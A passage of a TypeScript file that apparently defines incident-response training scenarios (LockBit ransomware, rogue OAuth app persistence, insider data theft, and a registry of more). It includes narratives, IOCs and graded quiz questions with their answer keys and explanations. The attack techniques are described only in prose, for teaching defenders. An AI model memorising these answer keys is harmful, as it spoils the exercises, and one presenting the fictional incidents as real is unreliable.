      answer: "zero", xp: 50,
      explanation: `${zero.hostname} is patient zero: it received the phishing email, executed the macro, established the C2 beacon, and performed the LSASS dump. ${server.hostname} was only compromised later via PsExec lateral movement from WS-FIN-1193.` },
    { id: "q2", prompt: "Which MITRE technique describes the lateral movement from WS-FIN-1193 to FS-CORP-01?", kind: "single",
      options: [
        { value: "T1021.002", label: "T1021.002 - SMB/Windows Admin Shares (pass-the-hash + PsExec)" },
        { value: "T1078",     label: "T1078 - Valid Accounts (reused plaintext admin password)" },
        { value: "T1021.001", label: "T1021.001 - Remote Desktop Protocol (interactive admin session)" },
        { value: "T1105",     label: "T1105 - Ingress Tool Transfer (downloading a file from the internet)" },
      ],
      answer: "T1021.002", xp: 50,
      explanation: "The file server's own records show it: a Type 3 NTLM logon for da-backup coming from WS-FIN-1193, a write of PSEXESVC.exe to the ADMIN$ share (5145), then the PSEXESVC service installed (7045) and started as SYSTEM. That is T1021.002 - SMB/Windows Admin Shares - using a stolen domain admin NTLM hash (pass-the-hash). RDP was not used, and downloading the payload later (T1105) is a separate step, not the movement between hosts." },
    { id: "q3", prompt: "Why did the attacker run vssadmin BEFORE starting encryption?", kind: "single",
      options: [
        { value: "inhibit",  label: "Destroy shadow copies so the victim cannot roll files back without paying (T1490)" },
        { value: "exfil",    label: "To export the shadow copy contents to their C2 server before encrypting the originals" },
        { value: "persist",  label: "To create a clean VSS snapshot they can restore from if they need to re-enter later" },
        { value: "escalate", label: "To escalate from local admin to SYSTEM by abusing the Volume Shadow Copy service" },
      ],
      answer: "inhibit", xp: 75,
      explanation: "Deleting Volume Shadow Copies (T1490 - Inhibit System Recovery) prevents the victim from using Windows built-in recovery to restore encrypted files. Without shadow copies or an external backup, the victim's only options are pay the ransom or restore from an offline backup - if one exists." },
    { id: "q4", prompt: "The CrowdStrike prevention policy was set to 'Detection Only' on servers. What should it have been, and what would that have changed?", kind: "single",
      options: [
        { value: "prevent",  label: "Prevention - the ransomware binary would have been blocked before encrypting any files" },
        { value: "monitor",  label: "Monitor - collects richer telemetry for the SOC to act on, but still without blocking" },
        { value: "disabled", label: "Disabled - file servers should not run EDR prevention because of the I/O performance impact" },
        { value: "detection", label: "Detection Only is correct - automatic blocking causes too many false positives on servers" },
      ],
      answer: "prevent", xp: 75,
      explanation: "The sensor did detect it - the detection record is right there in the feed. What stopped it from acting was the policy: with prevention disabled on this server it can only log what it sees. Setting Prevention on servers would have blocked the payload before encryption began. 'Detection Only' is a common server misconfiguration driven by availability fears, and here it cost the whole file server." },
    { id: "q5", prompt: "You have the full timeline. Which single containment action would have broken the attack chain before encryption - and held up as the right call at the moment it was taken?", kind: "single",
      options: [
        { value: "isolate_zero", label: "Network-isolate WS-FIN-1193 when the LSASS dump was detected at 04:45 - before any credential could be reused" },
        { value: "block_c2",     label: "Block the C2 domain at the perimeter firewall when beaconing to it started at 03:18 - the earliest network indicator" },
        { value: "isolate_fs",   label: "Network-isolate FS-CORP-01 when vssadmin deleted the shadow copies at 05:15 - the first confirmed destructive act" },
        { value: "disable_user", label: "Disable c.martin's account when the out-of-hours logon appeared at 02:45 - the very first anomaly in the timeline" },
      ],
      answer: "isolate_zero", xp: 100,
      explanation: "Isolating WS-FIN-1193 at the LSASS dump breaks the chain: it removes the attacker's foothold entirely, and it happens while the stolen hash is still unused - the first reuse is the 04:47 TGT request, two minutes later. Blocking the C2 domain at 03:18 is the tempting answer, and the evidence at 03:18 IS strong enough to act on: WINWORD spawning hidden PowerShell (Falcon alerted at 03:15:50) that then checks in every minute to a domain PAN-DB files under newly-registered-domain is a textbook Cobalt Strike beacon, not merely 'suspicious'. It fails for a different reason - blocking an indicator is not containing a host. The implant keeps running, and this scenario proves the attacker had a second channel: at 05:05 FS-CORP-01 downloads its payload from the raw IP " + c2Ip + ", which no domain block would have touched. Disabling c.martin at 02:45 acts on the only genuinely ambiguous event in the timeline and would not stop a beacon already executing in that user's session. By 05:15 the shadow copies are gone and the attacker holds domain admin, so isolating the file server then is damage control rather than prevention. The lesson: the right containment action is the one that removes the adversary's access, not the one that removes one of their indicators." },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "LockBit 3.0 affiliate (Ransomware-as-a-Service)",
    attack_kind: "ransomware",
    briefing: "CrowdStrike raised a critical detection on FS-CORP-01 at 05:18 and the Finance share is reporting inaccessible files. A separate high-severity alert fired earlier on WS-FIN-1193. Both are queued to you.",
    narrative: `At 03:15 on a Wednesday, a finance analyst working late received what appeared to be a payroll update email. The macro-enabled attachment bypassed email filters and spawned a Cobalt Strike beacon that checked in every minute at first, then every ten minutes, for about 80 minutes. At 04:43 the beacon elevated itself through a fodhelper UAC bypass, and two minutes later domain admin credentials were extracted from LSASS memory: da-backup's remote support session from the afternoon before had been disconnected, not logged off, so its credentials were still cached. The attacker enumerated the domain, pivoted over SMB to the central file server, pulled the LockBit payload down with certutil, deleted all 12 Volume Shadow Copies, cleared the Security and System event logs, then unleashed LockBit 3.0 - encrypting 2,847 files (18GB) across Finance, HR, and Contracts shares, adding a random nine-character extension, in under 2 minutes. Your job: identify patient zero, trace the lateral movement, understand why the CrowdStrike sensor didn't block it, and determine the earliest point where this attack could have been stopped.`,
    learning_objectives: [
      "Identify the patient zero host and trace the infection path through the kill chain",
      "Understand PsExec lateral movement via SMB pass-the-hash and SYSTEM-level execution",
      "Recognize pre-ransomware indicators: shadow copy deletion and event log clearing",
      "Understand the impact of 'Detection Only' vs 'Prevention' EDR policies",
      "Determine the earliest effective containment point in a ransomware attack chain",
      "Spot the UAC bypass that turns a user-level foothold into a credential-theft capability",
    ],
    alerts, events, iocs, killchain, questions,
  };
}

// =========================================================================
// Scenario 4: OAuth App Persistence - Cloud APT
// =========================================================================

export function buildOAuthScenario(scenarioId = "oauth-persistence-2026"): ScenarioBundle {
  const { title, events, T, MIN, HR, victim, sprayIp, sessionIp } = oauthScenarioEvents();

  const alerts = eventsToAlerts(events, scenarioId);
  const iocs: IOC[] = [
    { type: "ip",     value: sprayIp,                         reputation: "malicious",  tags: ["spray", "germany"] },
    { type: "ip",     value: sessionIp,                       reputation: "malicious",  tags: ["c2", "graph-api-access"] },
    { type: "domain", value: "microsoftupdate-secure.xyz",    reputation: "malicious",  tags: ["rogue-oauth-publisher"] },
    { type: "user",   value: victim.email,                    reputation: "suspicious", tags: ["victim", "compromised"] },
  ];

  const killchain = [
    { ts: T(0),           phase: "Credential Access",   action: "Password spray - 16 invalid-password sign-ins across 10 accounts from one address, below the lockout threshold" },
    { ts: T(10 * MIN),    phase: "Initial Access",       action: "s.chen's MFA prompt went unanswered twice and was approved the third time - account compromised via prompt fatigue" },
    { ts: T(15 * MIN),    phase: "Persistence",          action: "Rogue OAuth app 'MicrosoftSecurityUpdate' registered, given a service principal and a client secret" },
    { ts: T(16 * MIN),    phase: "Persistence",          action: "OAuth consent granted to the rogue app - the grant outlives the credential reset that follows" },
    { ts: T(1 * HR + 15 * MIN), phase: "Collection",    action: "Graph API reads 187 emails from compromised mailbox" },
    { ts: T(7 * HR),      phase: "Detection Gap",        action: "IT resets password under INC0004821 - the OAuth grant is not revoked and the app keeps getting tokens, attack continues" },
    { ts: T(11 * HR),     phase: "Exfiltration",         action: "27.1MB confidential product roadmap downloaded via Graph API" },
    { ts: T(12 * HR + 22 * MIN), phase: "Exfiltration", action: "89 files (340MB) downloaded from OneDrive via delegated OAuth between 14:52 and 15:00" },
  ];

  const questions: ScenarioQuestion[] = [
    { id: "q1", prompt: "Why did the password reset at T+7h NOT stop the attack?", kind: "single",
      options: [
        { value: "consent",  label: "A consented OAuth app generates tokens using its own credentials - password reset doesn't revoke consent" },
        { value: "cache",    label: "Entra ID replicates password changes asynchronously, so the new password was not enforced for several hours" },
        { value: "token",    label: "The access token issued before the reset stayed valid for its full 60-minute lifetime, covering the gap" },
        { value: "backup",   label: "The attacker had already created a second account with Global Administrator rights and used it instead" },
      ],
      answer: "consent", xp: 75,
      explanation: "The reset changed s.chen's password; it did not touch the application. The app is a separate identity with its own consent grant (the Consent to application and Add OAuth2PermissionGrant records at 02:46) and its own client secret (added at 02:45), and the refresh token it holds keeps working until someone revokes it: the non-interactive sign-ins for MicrosoftSecurityUpdate at 11:51 and 14:50, hours after the ticket was resolved, show the app still being issued Graph tokens for s.chen with no password and no MFA prompt, and the mail and file reads follow each one. The ticket notes record only a password reset: no revoked sign-in sessions, no removal of the enterprise application or its grant. Only revoking the grant and the sessions (Entra ID → Enterprise Applications) cuts the app off. MFA re-registration is irrelevant here - the attacker never satisfies an authentication factor; the application does the authenticating." },
    { id: "q2", prompt: "Which MITRE technique covers the rogue OAuth application registration?", kind: "single",
      options: [
        { value: "T1078",     label: "T1078 - Valid Accounts (compromised cloud user account)" },
        { value: "T1098.001", label: "T1098.001 - Account Manipulation: Additional Cloud Credentials" },
        { value: "T1550.001", label: "T1550.001 - Use Alternate Auth Material: Application Access Token" },
        { value: "T1556",     label: "T1556 - Modify Authentication Process (tenant auth policy)" },
      ],
      answer: "T1098.001", xp: 50,
      explanation: "T1098.001 covers adversaries registering or modifying applications in a cloud tenant to gain persistent access using delegated permissions. A rogue OAuth app holding a user's consent is the textbook example: the persistence lives on the service principal rather than on the account, so credential-centric response - password reset, MFA re-registration - leaves it entirely intact." },
    { id: "q3", prompt: "What is the FASTEST single action to stop ongoing data access through the OAuth app?", kind: "single",
      options: [
        { value: "revoke",  label: "Revoke consent to 'MicrosoftSecurityUpdate' in Entra ID Enterprise Applications" },
        { value: "pw",      label: "Reset s.chen's password again and enforce a stronger complexity requirement in the policy" },
        { value: "disable", label: "Disable s.chen's account in Entra ID and remove her from all mail-enabled groups" },
        { value: "block_ip", label: "Block 193.233.20.57 at the perimeter firewall and in Defender for Cloud Apps" },
      ],
      answer: "revoke", xp: 75,
      explanation: "Revoking the app's consent (and its sessions) stops it from being issued any new token, so Graph access ends as soon as the current short-lived token expires, for every user who consented. Account disable works but disrupts the legitimate user. IP blocking fails since the attacker can rotate IPs. A password reset has no effect on the app's token issuance, as the 11:51 and 14:50 sign-ins show." },
    { id: "q4", prompt: "Which permissions granted to the app are MOST dangerous? (select all)", kind: "multi",
      options: [
        { value: "mail_rw",   label: "Mail.ReadWrite - read and delete all mail" },
        { value: "files_rw",  label: "Files.ReadWrite.All - full SharePoint and OneDrive access" },
        { value: "user_read", label: "User.ReadBasic.All - read basic user profile info" },
        { value: "calendar",  label: "Calendars.Read - read calendar events" },
      ],
      answer: ["mail_rw", "files_rw"], xp: 100,
      explanation: "Mail.ReadWrite enables reading, modifying, and deleting all email - including financial communications used for BEC. Files.ReadWrite.All provides complete access to all SharePoint sites and OneDrive - enabling bulk data exfiltration as seen here. User.ReadBasic.All is low-risk (public profile data only). Calendars.Read was not granted in this scenario; the Consent to application record lists exactly Mail.ReadWrite, Files.ReadWrite.All and User.ReadBasic.All." },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "APT-CLOUDGHOUL (nation-state, cloud-focused IP theft)",
    attack_kind: "oauth_persistence",
    briefing: "Sentinel raised an alert at 18:30 on s.chen's account for anomalous Microsoft Graph activity. The helpdesk had already reset this user's password that morning under ticket INC0004821, following a suspicious sign-in report. Queued to you for scoping.",
    narrative: `A Senior Product Engineer's Entra ID account was compromised after a spray found her password and she approved the third MFA prompt at 02:40. Within 5 minutes the attacker, using her session, registered a convincingly named OAuth application ('MicrosoftSecurityUpdate'), gave it a client secret, and consented to delegated mail and file access (the tenant still let ordinary users register apps and consent to them). When IT reset the password 7 hours later following a user report, the Graph API calls didn't stop - the OAuth app kept being issued tokens and silently continued reading emails and downloading files for another 9 hours. By the time Sentinel alerted, 330 emails had been read, a confidential product roadmap had been exfiltrated, and 89 additional files totalling 340MB were gone. Your mission: explain the persistence mechanism, determine why the password reset failed, identify the correct remediation, and scope what was exfiltrated.`,
    learning_objectives: [
      "Understand how OAuth application consent creates persistence independent of user passwords",
      "Recognize rogue OAuth app registration as an Entra ID persistence technique (T1098.001)",
      "Identify the critical gap: DLP policies that don't inspect Microsoft Graph API access",
      "Understand why revoking app consent is the correct remediation (not password reset)",
      "Scope data exfiltration from Microsoft Graph API audit logs",
    ],
    alerts, events, iocs, killchain, questions,
  };
}

// =========================================================================
// Scenario 5: Insider Threat - Finance Data Exfiltration
// =========================================================================

export function buildInsiderThreatScenario(scenarioId = "insider-threat-2026"): ScenarioBundle {
  const { title, events, T, MIN, insider, zipHash } = insiderThreatScenarioEvents();

  const alerts = eventsToAlerts(events, scenarioId);
  const iocs: IOC[] = [
    { type: "user",   value: insider.email,                    reputation: "suspicious", tags: ["user"] },
    { type: "host",   value: insider.hostname,                 reputation: "unknown", tags: ["workstation"] },
    { type: "email",  value: "m.torres.backup@gmail.com",      reputation: "suspicious", tags: ["external-mailbox"] },
    { type: "sha256", value: zipHash,                          reputation: "unknown", tags: ["archive"] },
    { type: "url",    value: "https://www.googleapis.com/upload/storage/v1/b/personal-backup-m/o", reputation: "suspicious", tags: ["upload-target"] },
  ];

  const killchain = [
    { ts: T(5 * MIN),  phase: "Collection",                   action: "HR site opened, then the headcount plan and seven Finance workbooks downloaded one after another (47 files in 15 minutes by 13:25)" },
    { ts: T(25 * MIN), phase: "Detection",                    action: "DLP 'Finance-PII-Bulk-Download' fires, action is notify-only, not block" },
    { ts: T(30 * MIN), phase: "Exfiltration - USB",           action: "SanDisk USB drive mounted as E:, 8 of the downloaded workbooks (10.3MB) written to E:\\Finance_Backup within 8 seconds; the endpoint DLP rule only audits" },
    { ts: T(33 * MIN), phase: "Exfiltration - Print",         action: "3 files, including the headcount plan, sent to the HP-FIN-FLOOR2 printer" },
    { ts: T(35 * MIN), phase: "Exfiltration - Cloud (Blocked)", action: "Finance_Backup.zip (9.8MB) upload to a personal Google Cloud Storage bucket blocked by the Zscaler DLP rule" },
    { ts: T(40 * MIN), phase: "Exfiltration - Email",         action: "4.5MB of payroll, bonus and commission workbooks emailed to a personal Gmail address: DLP audited, did not block" },
  ];

  const questions: ScenarioQuestion[] = [
    { id: "q1", prompt: "Which single indicator MOST strongly suggests intentional insider data theft rather than accidental bulk download?", kind: "single",
      options: [
        { value: "volume",  label: "47 files pulled from the Finance SharePoint site in one 15-minute session" },
        { value: "hr_flag", label: "Pending HR termination flag combined with bulk PII access and an immediate USB copy" },
        { value: "hours",   label: "The downloads all occurred during normal business hours from the user's assigned workstation" },
        { value: "browser", label: "Visits to Indeed.com and LinkedIn Jobs later the same afternoon" },
      ],
      answer: "hr_flag", xp: 75,
      explanation: "The Workday record shows a termination task for m.torres effective the next day, the downloads follow it, and the first file is written to the USB drive 5 seconds after the drive is mounted: the convergence is the strongest multi-indicator of deliberate intent. Volume alone could be accidental. Business hours are expected. Job browsing (14:15, after everything else) is common and, on its own, proves nothing." },
    { id: "q2", prompt: "Zscaler blocked the upload of Finance_Backup.zip to a personal Google Cloud Storage bucket, but the USB copy and the email to a personal Gmail address both completed. What is the root cause of the USB gap?", kind: "single",
      options: [
        { value: "threshold", label: "The DLP bulk-download threshold (20 files) was set too high, so the USB copy was never DLP-inspected" },
        { value: "no_policy", label: "The endpoint DLP rule for copies to removable media was in audit mode, so the copy was recorded but never blocked" },
        { value: "bypass",    label: "The user encrypted the files before copying them, so DLP content inspection could not read the USB transfer" },
        { value: "cloud",     label: "The USB drive mounted as E:\\, a fixed-disk letter that endpoint DLP excludes from its removable-media rules" },
      ],
      answer: "no_policy", xp: 75,
      explanation: "The Purview endpoint DLP record for the 13:30 copy (policy Endpoint-DLP-Removable-Media-Copy) carries Actions Audit and EnforcementMode Audit: the rule matched the restricted workbooks and only logged them, exactly like the external-email and print rules. The only blocking control was the Zscaler web rule on the cloud upload (action Blocked), which is why that channel failed and the other two did not. The files were not encrypted (the rule matched their content), E: was recognised as a removable disk by the 6416 device record, and the bulk-download rule is a SharePoint rule that has nothing to do with USB writes." },
    { id: "q3", prompt: "Which MITRE techniques are present in this incident? (select all that apply)", kind: "multi",
      options: [
        { value: "T1213.002", label: "T1213.002 - Data from Information Repositories: SharePoint (the bulk download)" },
        { value: "T1052.001", label: "T1052.001 - Exfiltration over USB Device" },
        { value: "T1567.002", label: "T1567.002 - Exfiltration to Cloud Storage (Google Cloud Storage upload - blocked)" },
        { value: "T1486",     label: "T1486 - Data Encrypted for Impact (files encrypted on the workstation for ransom)" },
      ],
      answer: ["T1213.002", "T1052.001", "T1567.002"], xp: 100,
      explanation: "T1213.002 (the SharePoint bulk download), T1052.001 (the USB copy) and T1567.002 (the attempted upload to Google Cloud Storage, blocked) are all present. The email to a personal mailbox is a fourth channel (T1048.003). No ransomware or encryption occurred: this is a pure data-exfiltration insider case." },
    { id: "q4", prompt: "What IMMEDIATE actions should the SOC take upon discovering this incident? (select all)", kind: "multi",
      options: [
        { value: "legal",    label: "Alert Legal/HR and preserve the USB as potential evidence" },
        { value: "disable",  label: "Disable m.torres's account and revoke all active sessions immediately" },
        { value: "scan",     label: "Run a full CrowdStrike on-demand malware scan across all finance department hosts" },
        { value: "preserve", label: "Preserve forensic image of WS-FIN-4421 before any changes" },
      ],
      answer: ["legal", "disable", "preserve"], xp: 100,
      explanation: "Legal/HR must be notified immediately - this is a potential crime requiring chain-of-custody for the USB device. The account must be disabled to prevent further exfiltration. Forensic image preservation is critical before any remediation. AV scan is unnecessary - this is an insider threat, not malware." },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "To be determined",
    attack_kind: "insider_threat",
    briefing: "Microsoft Purview DLP fired policy Finance-PII-Bulk-Download on m.torres at 13:25. Microsoft Sentinel UEBA raised a separate anomaly on the same account shortly after. m.torres works from the Finance workstation WS-FIN-4421. No containment has been applied.",
    narrative: `HR notified payroll - but not IT Security - that a finance analyst was being terminated the following day. Between 13:07 and 13:22 the analyst downloaded the headcount reduction plan and seven payroll and compensation workbooks from the HR and Finance SharePoint sites, 47 files by the time Microsoft Purview DLP fired a High severity alert at 13:25. The policy action was 'notify user only', not block. A SanDisk USB drive was mounted at 13:30 and eight of the downloaded workbooks (10.3MB) were written to it within twelve seconds of the mount; the endpoint DLP rule for removable media only audited the copy. Three files were also printed. The analyst then compressed the workbooks into Finance_Backup.zip and tried to upload it to a personal Google Cloud Storage bucket, which Zscaler blocked, and emailed 4.5MB of payroll, bonus and commission files to a personal Gmail address, which succeeded because that DLP rule was also audit-only. Your job: determine what was successfully exfiltrated, identify every detection gap, and recommend both immediate containment and long-term policy changes.`,
    learning_objectives: [
      "Recognize multi-indicator insider threat patterns combining HR context with technical telemetry",
      "Understand the difference between DLP detection-only vs. block policies and their impact",
      "Identify multiple simultaneous exfiltration channels (USB, cloud upload, email, print)",
      "Understand forensic evidence preservation requirements for insider threat investigations",
      "Identify permission scope issues (over-broad cross-site access) that enabled the incident",
    ],
    alerts, events, iocs, killchain, questions,
  };
}

// =========================================================================

// Scenario registry
// =========================================================================

export const SCENARIOS = [
  { slug: "phishing-malware-basic",
    title: "EDR alert on an HR workstation",
    difficulty: "beginner", attack_kind: "phishing_malware_basic",
    threat_actor: "Commodity Malware Operator", build: withAlerts(buildPhishingMalwareScenario),
    summary: "The EDR stopped a process on an HR workstation, and the firewall logged an outbound session from the same host. Investigate what ran, how it arrived and whether anything left the machine, then write the report." },
  { slug: "usb-malware-basic",
    title: "EDR quarantine on an operations workstation",
    difficulty: "beginner", attack_kind: "usb_malware_basic",
    threat_actor: "Commodity Malware / Opportunistic Physical Access", build: withAlerts(buildUsbMalwareScenario),
    summary: "The EDR quarantined a file on an operations workstation, and the SIEM matched a DNS lookup from the same host to threat intelligence. Work out what happened on the host and what needs to be contained." },
  { slug: "phishing-to-cloud-exfil",
    title: "Unassigned EDR detection on a finance workstation",
    difficulty: "intermediate", attack_kind: "phishing_to_exfil",
    threat_actor: "TA-COBALTSPIDER", build: withAlerts(buildPhishingToExfil),
    summary: "A high-severity EDR detection on a finance analyst's workstation has sat unassigned for an hour. Trace what happened across the endpoint and the cloud account, and decide what to contain." },
  { slug: "bec-mailbox-rule",
    title: "Failed AD FS logons and a CFO call",
    difficulty: "beginner", attack_kind: "identity_bec",
    threat_actor: "TA-VOIDPELICAN", build: withAlerts(buildBecScenario),
    summary: "Sentinel flagged a burst of failed AD FS logons across many accounts, and the CFO later called the help desk about unexpected prompts on her phone. Investigate which accounts were affected and what happened in them." },
  { slug: "ransomware-lockbit",
    title: "Critical file server alert and an unreachable Finance share",
    difficulty: "advanced", attack_kind: "ransomware",
    threat_actor: "LockBit 3.0 Affiliate", build: withAlerts(buildRansomwareScenario),
    summary: "A critical detection fired on the corporate file server while the Finance share reports inaccessible files, and an earlier alert sits on a finance workstation. Investigate both, establish the scope and write the report." },
  { slug: "oauth-app-persistence",
    title: "Graph activity alert after a password reset",
    difficulty: "advanced", attack_kind: "oauth_persistence",
    threat_actor: "APT-CLOUDGHOUL", build: withAlerts(buildOAuthScenario),
    summary: "Sentinel flagged unusual Microsoft Graph activity on an account whose password the help desk had reset that morning. Scope what the account has been doing and decide what containment it needs." },
  { slug: "insider-threat-finance",
    title: "DLP download alert on a finance workstation",
    difficulty: "intermediate", attack_kind: "insider_threat",
    threat_actor: "To be determined", build: withAlerts(buildInsiderThreatScenario),
    summary: "Purview DLP and Sentinel UEBA both flagged activity on a finance user's account and workstation, and no containment has been applied. Establish what happened and whether it was authorised." },
  { slug: "kerberoasting",
    title: "Kerberos ticket volume alert for a developer account",
    difficulty: "advanced", attack_kind: "credential_theft_kerberoasting",
    threat_actor: "Internal Attacker (Compromised Developer)",
    build: withAlerts(buildKerberoastingScenario),
    summary: "Sentinel and Defender for Identity flagged unusual Kerberos activity for a developer's account and workstation, and a related alert on a database server is attached. Investigate what the account did and how far it reached." },
  { slug: "dns-tunneling",
    title: "DNS volume anomaly on an engineering workstation",
    difficulty: "advanced", attack_kind: "c2_dns_tunneling",
    threat_actor: "APT-TUNNELRAT",
    build: withAlerts(buildDNSTunnelingScenario),
    summary: "Sentinel flagged an engineering workstation sending far more DNS queries than its baseline, and the firewall logged port 53 traffic leaving the network. Find what is generating the traffic and what it carries." },
  { slug: "lolbins",
    title: "Rare command-line alert on an HR workstation",
    difficulty: "advanced", attack_kind: "lolbins_defense_evasion",
    threat_actor: "TA-GHOSTSHELL",
    build: withAlerts(buildLOLBinsScenario),
    summary: "Sentinel flagged a rare command line on an HR workstation, and the firewall logged outbound HTTP from the same host in that window. Reconstruct what ran on the host and what it left behind." },
  { slug: "aws-key-leak-s3-exfil",
    title: "Secret scanning alert on a public deploy repo",
    difficulty: "advanced", attack_kind: "cloud_credential_leak",
    threat_actor: "Financially motivated actor scanning public repos for cloud keys",
    build: withAlerts(buildCloudKeyLeakS3ExfilScenario),
    summary: "GitHub secret scanning flagged an AWS access key in a public RocketStack repository, and GuardDuty has since raised findings on the same account. Scope the account and decide what to contain." },
  { slug: "dcsync-golden-ticket",
    title: "Late-night admin RDP logon to a domain controller",
    difficulty: "advanced", attack_kind: "dcsync_golden_ticket",
    threat_actor: "APT-IRONBEAR (nation-state, Russia nexus)",
    build: withAlerts(buildDCSyncScenario),
    summary: "An IT admin account logged on interactively to a NexaCorp domain controller from an external address late at night, and Defender raised a tool detection soon after. Investigate what happened on the DC and what it means for the domain." },
  { slug: "supply-chain-vendor-update",
    title: "EDR detection on a production server after an update",
    difficulty: "advanced", attack_kind: "supply_chain",
    threat_actor: "APT-SHADOWSUPPLY (nation-state supply chain operator)",
    build: withAlerts(buildSupplyChainScenario),
    summary: "CrowdStrike flagged a production server that completed an approved vendor agent update earlier that afternoon, and the firewall shows repeated outbound HTTPS since. Determine whether the two are related and what is affected." },
  { slug: "mfa-fatigue-ato",
    title: "Overnight high-severity alert on an IT administrator",
    difficulty: "beginner", attack_kind: "mfa_fatigue_ato",
    threat_actor: "UNC3944",
    build: withAlerts(buildMfaFatigueScenario),
    summary: "Sentinel raised a high-severity alert overnight on an IT administrator who holds Okta and Entra admin roles, and the user has not been reached. Reconstruct the account's activity and decide what to contain." },
  { slug: "asrep-roasting",
    title: "Identity alert naming three service accounts",
    difficulty: "intermediate", attack_kind: "asrep_roasting",
    threat_actor: "APT28 (Fancy Bear)",
    build: withAlerts(buildAsRepRoastingScenario),
    summary: "Defender for Identity raised an alert with a developer workstation as the source and three service accounts as targets, and the ticket was picked up hours later. Use the DC, firewall and EDR logs to establish what followed." },
  { slug: "ntlm-relay-responder",
    title: "Tooling detection on a developer workstation",
    difficulty: "advanced", attack_kind: "ntlm_relay",
    threat_actor: "FIN7 (compromised internal machine)",
    build: withAlerts(buildNtlmRelayScenario),
    summary: "CrowdStrike flagged tooling on a developer workstation, and a file server later recorded a service installation and a logon for a finance analyst. Work out how these events connect and how far the activity spread." },
  { slug: "k8s-pod-escape-imds",
    title: "GuardDuty finding on the production EKS cluster",
    difficulty: "advanced", attack_kind: "k8s_pod_escape",
    threat_actor: "APT40",
    build: withAlerts(buildK8sPodEscapeScenario),
    summary: "GuardDuty flagged unusual use of the EKS node role, and the Kubernetes audit log shows exec activity into a production container by a CI service account. Trace the activity across the cluster, its nodes and the AWS account." },
  { slug: "oauth-consent-grant-phishing",
    title: "DLP alert on a Finance SharePoint contract",
    difficulty: "expert", attack_kind: "oauth_consent_phishing",
    threat_actor: "APT29 / Cozy Bear",
    build: withAlerts(buildOAuthConsentPhishingScenario),
    summary: "Purview DLP fired on a contract in the Finance SharePoint site, and Defender for Cloud Apps flagged a third-party app the same user authorized that evening. Investigate what the app did and decide what contains it." },
  { slug: "backup-agent-false-positive",
    title: "Overnight behaviour alert on a production file server",
    difficulty: "beginner", attack_kind: "false_positive",
    threat_actor: "None — authorised backup activity", build: withAlerts(buildBackupFalsePositiveScenario),
    summary: "Defender for Endpoint raised a high-severity behaviour alert on a production file server overnight, and the night shift is holding for an isolate decision. Investigate the process behind it and make the call with evidence." },
  { slug: "brute-force-single-account",
    title: "Logon failures on the published Remote Desktop server",
    difficulty: "beginner", attack_kind: "credential_access",
    threat_actor: "Opportunistic external attacker", build: withAlerts(buildBruteForceSingleAccountScenario),
    summary: "Sentinel raised a high alert for a long run of failed logons against one user on the internet-published Remote Desktop server, followed by a success. Establish what happened to that user and whether anything followed." },
  { slug: "rogue-admin-account",
    title: "Late-evening privileged group change on the DC",
    difficulty: "beginner", attack_kind: "persistence",
    threat_actor: "Attacker using stolen service desk credentials", build: withAlerts(buildRogueAdminAccountScenario),
    summary: "Sentinel flagged a new domain user who joined a privileged group within an hour of being created. Establish whether this was authorised and report what has happened since." },
  { slug: "impossible-travel-basic",
    title: "Two-city sign-ins for an accounts payable clerk",
    difficulty: "beginner", attack_kind: "account_takeover",
    threat_actor: "Business Email Compromise operator", build: withAlerts(buildImpossibleTravelBasicScenario),
    summary: "Sentinel flagged two successful sign-ins for an accounts payable clerk from different cities hours apart, while Finance say she is working from London. Determine what happened to the account and what was done with it." },
  { slug: "software-install-false-positive",
    title: "Behavioural EDR alert on an engineering workstation",
    difficulty: "beginner", attack_kind: "false_positive",
    threat_actor: "None — authorised software deployment", build: withAlerts(buildSoftwareInstallFalsePositiveScenario),
    summary: "CrowdStrike raised a high behavioural detection on an engineering workstation after a new executable and service appeared and an outbound session opened. Determine what ran and whether the host needs to be contained." },
  { slug: "web-shell-sqli",
    title: "WAF blocks and an EDR alert on the shop",
    difficulty: "advanced", attack_kind: "web_exploitation",
    threat_actor: "Opportunistic web attacker", build: withAlerts(buildWebShellRceScenario),
    summary: "Blocked WAF requests against shop.nexacorp.com and a Defender detection on its IIS web server are both queued, on the day of a scheduled PCI scan. Pivot across WAF, IIS, SQL and EDR logs to work out what reached the server." },
  { slug: "linux-ssh-persistence",
    title: "Falcon detection on a Linux backup server",
    difficulty: "intermediate", attack_kind: "linux_ssh_intrusion",
    threat_actor: "Opportunistic SSH-scanning intrusion set", build: withAlerts(buildLinuxSshPersistenceScenario),
    summary: "Falcon flagged a process running from a hidden directory under a service account's home on a Linux backup server. Use sshd, auditd, Falcon and firewall logs to work out how it got there, what it talks to and whether it will return." },
  { slug: "aitm-token-theft",
    title: "Sign-ins six minutes apart for a finance user",
    difficulty: "advanced", attack_kind: "aitm_session_hijack",
    threat_actor: "Phishing-as-a-Service operator", build: withAlerts(buildAitmTokenTheftScenario),
    summary: "Entra ID flagged two sign-ins for a finance user six minutes apart from different countries, while the user reports nothing wrong. A travel alert on another user is attached for comparison: investigate both and decide what each needs." },
  { slug: "esxi-ransomware",
    title: "Every guest on PROD-CLUSTER-A unreachable on Saturday night",
    difficulty: "expert", attack_kind: "ransomware_hypervisor",
    threat_actor: "Akira affiliate (big-game ransomware)", build: withAlerts(buildEsxiRansomwareScenario),
    summary: "The NOC escalated that every guest on a production virtualisation cluster is unreachable and dozens of sensors are offline, with no change window open. Work out what happened from the telemetry you still have." },
  { slug: "okta-password-burst",
    title: "Overnight Okta sign-in failures for one account",
    difficulty: "beginner", attack_kind: "credential_access",
    threat_actor: "Opportunistic credential-attack operator", build: withAlerts(buildOktaPasswordBurstScenario),
    summary: "The SIEM raised a medium alert for a burst of overnight Okta sign-in failures from one external IP against a RocketStack user, with no sessions created. Work out what actually changed for the user and what the ticket should ask for." },
  { slug: "fake-browser-update",
    title: "Critical EDR detection on a laptop while browsing",
    difficulty: "beginner", attack_kind: "drive_by_compromise",
    threat_actor: "Commodity drive-by operator", build: withAlerts(buildFakeBrowserUpdateScenario),
    summary: "Falcon raised a critical detection on a laptop for a script interpreter launching PowerShell while the user was browsing. Work out how the file got onto the machine and how far the activity got." },
  { slug: "trojanized-installer-keylogger",
    title: "Critical alert after a free PDF tool install",
    difficulty: "beginner", attack_kind: "input_capture",
    threat_actor: "Commodity infostealer distributor", build: withAlerts(buildTrojanizedInstallerKeyloggerScenario),
